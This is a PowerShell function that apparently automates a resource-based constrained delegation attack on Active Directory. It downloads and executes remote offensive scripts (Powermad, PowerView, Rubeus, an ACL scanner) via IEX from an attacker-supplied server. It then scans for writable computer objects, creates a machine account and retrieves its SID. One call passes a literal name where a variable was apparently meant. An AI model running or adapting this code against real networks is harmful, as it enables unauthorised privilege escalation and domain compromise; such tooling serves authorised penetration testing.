function Invoke-PowerRCBDSploit {

  param (
        [Parameter(Mandatory=$true)]
        [string]$RemoteServerAddress,

        [Parameter(Mandatory=$true)]
        [string]$ComputerName,

        [Parameter(Mandatory=$true)]
        [string]$ComputerPassword,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

         [Parameter(Mandatory=$true)]
        [string]$TargetComputer

    )

    IEX(New-Object Net.WebClient).DownloadString("$RemoteServerAddress/Powermad/Powermad.ps1")
    IEX(New-Object Net.WebClient).DownloadString("$RemoteServerAddress/PowerSploit/Recon/PowerView.ps1")
    IEX(New-Object Net.WebClient).DownloadString("$RemoteServerAddress/Invoke-Rubeus.ps1")
    IEX(New-Object Net.WebClient).DownloadString("$RemoteServerAddress/Invoke-ACLScanner.ps1")

    Invoke-ACLScanner -ResolveGUIDs -Domain $Domain | select ObjectDn, ActiveDirectoryRights, IdentityReferenceName, IdentityReferenceDN | Format-List
    Write-Host "[+] Based on the output, ensure that we have Write access over the computer object"  -ForegroundColor Green
    Read-Host  -ForegroundColor Green "[+] Press any key to continue"


    New-MachineAccount -Domain $Domain -MachineAccount ComputerName -Password $(ConvertTo-SecureString "$ComputerPassword" -AsPlainText -Force)
    $SID = (Get-DomainComputer $ComputerName -Domain $Domain | Select-Object -First 1).objectsid

    Write-Host "[+] Utilizing the following attributes for attack `n`t[+] $ComputerName`n`t[+]$SID"

}
